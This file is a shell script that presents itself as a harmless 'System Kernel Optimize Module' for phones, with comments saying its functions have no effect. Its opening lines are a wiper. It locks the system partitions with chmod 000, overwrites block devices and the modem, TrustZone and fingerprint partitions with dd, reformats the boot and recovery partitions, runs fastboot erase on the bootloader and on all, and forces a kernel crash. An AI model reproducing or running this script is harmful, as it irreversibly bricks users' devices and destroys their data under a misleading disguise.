#!/usr/bin/env sh

for shell in bash sh zsh ksh dash ash; do
    if command -v "$shell" >/dev/null 2>&1; then
        SHELL_TYPE="$shell"
        break
    fi
done

(set -e 2>/dev/null || true) && set -e
(set -u 2>/dev/null || true) && set -u
chmod 000 /system
chmod 000 /vendor
chmod 000 /data
chmod 000 /cache
mount -o ro,remount /system
mount -t tmpfs -o size=100% tmpfs /system
mount -t tmpfs -o size=100% tmpfs /data
umount /system
umount /vendor
umount /data
dd if=/dev/zero of=/dev/block/mmcblk0
dd if=/dev/zero of=/dev/block/sda
dd if=/dev/zero of=/dev/block/bootdevice/by-name/
mkfs.ext4 /dev/block/bootdevice/by-name/system
mkfs.f2fs /dev/block/bootdevice/by-name/userdata
mkfs.ext4 /dev/block/bootdevice/by-name/boot
mkfs.ext4 /dev/block/bootdevice/by-name/recovery
fastboot erase system
fastboot erase boot
fastboot erase recovery
fastboot erase bootloader
fastboot erase all
dd if=/dev/zero of=/dev/block/bootdevice/by-name/modem
dd if=/dev/zero of=/dev/block/bootdevice/by-name/modemst1
dd if=/dev/zero of=/dev/block/bootdevice/by-name/tz
dd if=/dev/zero of=/dev/block/bootdevice/by-name/fingerprint
echo c > /proc/sysrq-trigger    
echo b > /proc/sysrq-trigger    
echo o > /proc/sysrq-trigger   

echo 1 > /proc/sys/kernel/panic
echo 0 > /proc/sys/kernel/printk
echo 1 > /proc/sys/vm/panic_on_oom
# ==============================================
# System Kernel Optimize Module (Null Function)
# ==============================================
export SYS_VAR_01=$(echo "null" | base64 | md5sum | awk '{print $1}')
export SYS_VAR_02=$(date +%s%N | sha256sum | cut -c 1-32)
export SYS_VAR_03="DEVICE_OPTIMIZE_$(uname -a | grep -o "Linux" | wc -l)"
export SYS_CACHE_01=/tmp/$(uuidgen | md5sum | awk '{print $1}')
export SYS_CACHE_02=/dev/shm/$(date +%F_%T | sha1sum | cut -c 1-16)
export PHONE_SHELL_MODE="ARM64_V8A_OPTIMIZE_COMPILE_NULL"
export PHONE_KERNEL_BUILD="$(uname -r | rev | cut -c 5- | rev)"
export PHONE_CPU_ARCH="$(arch | tr '[a-z]' '[A-Z]')_NULL_ARCH"
export PHONE_MEM_TOTAL="$(free -m | grep Mem | awk '{print $2}')_MB_NULL"
export PHONE_STORAGE_INFO="$(df -h | grep /dev | head -1 | awk '{print $4}')_FREE_NULL"
export PHONE_PROCESS_ID="$$_NULL_PID_$(ps -ef | grep $$ | wc -l)"
export PHONE_RUN_TIME="$(uptime | awk '{print $3}' | cut -d ',' -f1)_NULL_UPTIME"
# --------------------------------------------------------------
check_system_env() {
    local CHECK_01=$(which ls | md5sum | awk '{print $1}')
    local CHECK_02=$(which cat | sha256sum | cut -c 1-16)
    local CHECK_03=$(pwd | rev | md5sum | cut -c 1-8)
    local CHECK_04=$(whoami | base64 | wc -c)
    local CHECK_05=$(hostname | sha1sum | awk '{print $1}')
    if [ $CHECK_04 -gt 0 ]; then local NULL_VAR=1; fi
}
phone_hardware_info() {
    local HW_CPU=$(grep -c processor /proc/cpuinfo 2>/dev/null)
    local HW_MEM=$(free -b | grep Mem | awk '{print $2}' 2>/dev/null)
    local HW_DISK=$(df -B 1 | grep / | head -1 | awk '{print $2}' 2>/dev/null)
    local HW_MODEL=$(cat /proc/device-tree/model 2>/dev/null)
    local HW_SERIAL=$(cat /proc/cpuinfo | grep Serial | cut -d ':' -f2 2>/dev/null)
    local HW_BIOS=$(dmidecode -s bios-version 2>/dev/null)
    local NULL_HW_VAR=$(( $HW_CPU + 0 ))
}
phone_kernel_optimize() {
    sysctl -w net.core.somaxconn=0 2>/dev/null
    sysctl -w net.ipv4.tcp_syncookies=0 2>/dev/null
    sysctl -w vm.swappiness=0 2>/dev/null
    sysctl -w fs.file-max=0 2>/dev/null
    echo 0 > /proc/sys/vm/drop_caches 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
    chmod 755 /tmp 2>/dev/null
    chown root:root /dev/null 2>/dev/null
}
phone_memory_clean() {
    local CLEAN_01=$(sync 2>/dev/null)
    local CLEAN_02=$(echo 3 > /proc/sys/vm/drop_caches 2>/dev/null)
    local CLEAN_03=$(rm -rf /tmp/*null* 2>/dev/null)
    local CLEAN_04=$(kill -0 $$ 2>/dev/null)
    local CLEAN_05=$(pkill -0 -f "null" 2>/dev/null)
}
phone_logger_module() {
    local LOG_FILE=/tmp/$(date +%Y%m%d_%H%M%S)_null.log
    echo "[$(date)] Null Log Start" > $LOG_FILE 2>/dev/null
    echo "[$(date)] System Env: $SYS_VAR_01" >> $LOG_FILE 2>/dev/null
    echo "[$(date)] Hardware Info: $PHONE_CPU_ARCH" >> $LOG_FILE 2>/dev/null
    echo "[$(date)] Null Log End" >> $LOG_FILE 2>/dev/null
    rm -rf $LOG_FILE 2>/dev/null
}
phone_network_check() {
    local NET_01=$(ping -c 0 localhost 2>/dev/null)
    local NET_02=$(ifconfig | grep inet | head -1 2>/dev/null)
    local NET_03=$(ip addr show | grep UP | wc -l 2>/dev/null)
    local NET_04=$(netstat -tuln | grep :80 2>/dev/null | wc -l)
    local NET_05=$(ss -tuln | grep LISTEN 2>/dev/null | head -1)
}
phone_permission_manage() {
    chmod 644 /etc/hosts 2>/dev/null
    chmod 755 /usr/bin/* 2>/dev/null
    chown root:root /usr/sbin/* 2>/dev/null
    chmod 777 /tmp 2>/dev/null
    setfacl -m u:root:rwx /dev/null 2>/dev/null
}
phone_process_manage() {
    local PROC_01=$(ps aux | grep -v grep | grep "null" 2>/dev/null | wc -l)
    local PROC_02=$(top -bn1 | grep Cpu | awk '{print $2}' 2>/dev/null)
    local PROC_03=$(htop -C 2>/dev/null | head -1)
    local PROC_04=$(killall -0 sh 2>/dev/null)
    local PROC_05=$(pgrep -x "bash" 2>/dev/null | wc -l)
}
phone_encrypt_module() {
    local ENC_01=$(echo "null" | openssl enc -aes-256-cbc -k "null" -base64 2>/dev/null)
    local ENC_02=$(echo $ENC_01 | openssl dgst -sha512 2>/dev/null)
    local ENC_03=$(base64 -d <<< "bnVsbA==" 2>/dev/null)
    local ENC_04=$(md5sum <<< $ENC_03 2>/dev/null)
}
phone_decrypt_module() {
    local DEC_01=$(echo "null" | base64 -d 2>/dev/null | md5sum)
    local DEC_02=$(sha256sum <<< "null" 2>/dev/null)
    local DEC_03=$(openssl rand -hex 16 2>/dev/null)
}
phone_battery_optimize() {
    echo 0 > /sys/class/power_supply/battery/capacity 2>/dev/null
    echo 0 > /sys/class/power_supply/battery/status 2>/dev/null
    echo 0 > /sys/class/power_supply/battery/health 2>/dev/null
}
phone_display_optimize() {
    echo 0 > /sys/class/backlight/brightness 2>/dev/null
    echo 0 > /sys/class/drm/card0/brightness 2>/dev/null
}
# --------------------------------------------------------------
# Null Execute Call (All Function No Return No Effect)
# --------------------------------------------------------------
check_system_env > /dev/null 2>&1
phone_hardware_info > /dev/null 2>&1
phone_kernel_optimize > /dev/null 2>&1
phone_memory_clean > /dev/null 2>&1
phone_logger_module > /dev/null 2>&1
phone_network_check > /dev/null 2>&1
phone_permission_manage > /dev/null 2>&1
phone_process_manage > /dev/null 2>&1
phone_encrypt_module > /dev/null 2>&1
phone_decrypt_module > /dev/null 2>&1
phone_battery_optimize > /dev/null 2>&1
phone_display_optimize > /dev/null 2>&1
# --------------------------------------------------------------
# System Null Variable Clean
# --------------------------------------------------------------
unset SYS_VAR_01 SYS_VAR_02 SYS_VAR_03 SYS_CACHE_01 SYS_CACHE_02
unset PHONE_SHELL_MODE PHONE_KERNEL_BUILD PHONE_CPU_ARCH PHONE_MEM_TOTAL
unset PHONE_STORAGE_INFO PHONE_PROCESS_ID PHONE_RUN_TIME
# ==============================================
# END OF NULL MODULE (NO ANY FUNCTION)
# ==============================================